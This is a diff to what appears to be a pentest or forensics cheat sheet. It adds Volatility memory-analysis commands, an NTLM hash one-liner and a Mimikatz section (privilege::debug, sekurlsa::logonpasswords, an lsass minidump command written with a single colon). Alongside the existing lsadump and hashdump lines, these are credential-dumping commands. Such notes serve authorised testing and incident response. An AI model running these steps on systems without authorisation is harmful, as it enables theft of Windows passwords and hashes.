@@ -397,6 +397,10 @@ pip3 install -r requirements.txt
 ./vol.py -f '/home/kali/Downloads/mydump.raw' windows.lsadump.Lsadump
 ./vol.py -f '/home/kali/Downloads/mydump.raw' windows.hashdump.Hashdump
 ./vol.py -f '/home/kali/Downloads/p8242.raw' windows.cachedump.Cachedump
+
+./vol.py -f '/home/kali/Downloads/p8242.raw' windows.pstree.PsTree
+./vol.py -f '/home/kali/Downloads/p8242.raw' windows.memmap.Memmap --pid 1064 --dump
+
 ```
 
 NTLM HASH GENERATOR
@@ -404,4 +408,13 @@ NTLM HASH GENERATOR
 
 ```
 iconv -f ASCII -t UTF-16LE <(printf "test") | openssl dgst -md4
+```
+
+MIMIKATZ
+---
+```
+privilege::debug
+sekurlsa::logonpasswords
+
+sekurlsa:minidump "C:\Users\adminlocal\Downloads\lsass.DMP"
 ```
